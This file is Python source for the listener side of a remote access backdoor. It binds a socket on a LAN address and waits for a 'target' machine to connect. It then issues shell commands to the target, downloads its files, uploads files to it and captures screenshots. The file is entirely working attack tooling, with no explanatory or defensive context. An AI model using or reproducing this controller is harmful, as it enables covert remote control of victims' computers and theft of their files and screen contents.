#!/usr/bin/python
import socket
import json, base64

count = 1
def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)
	
	
def reliable_receive():
	json_data = ""
	while True:
		try: 
			json_data = json_data + target.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue  


def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("192.168.43.23",54321))
	s.listen(5)
	print("Listening for incoming connections")
	target, ip = s.accept()
	print("Target connected !!")
	
def shell():
	global count
	while True:
		command = raw_input("* Shell#~%s : " %str(ip))
		reliable_send(command)
		if command == "q":
			break
		elif command[:2] == "cd" and len(command) > 1:
			continue
			
		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				result = reliable_receive()
				file.write(base64.b64decode(result))
				
		elif command[:6] == "upload":
			try:
				with open(command[7:], "rb") as fin:
					reliable_send(base64.b64encode(fin.read()))
			except:
				failed ="Failed to upload"
				reliable_send(base64.b64encode(failed))	
		elif command[:10] == "screenshot":
			with open("screenshot%d" % count, "wb") as screen:
				image = reliable_receive()
				image_decoded = base64.b64decode(image)
				if image_decoded[:6] == "Failed":
					print(image_decoded)						
				else:
					screen.write(image_decoded)
					count+=1			
				
		else:
			#result = target.recv(1024)
			result = reliable_receive()
			print(result)
server()
shell()
s.close()
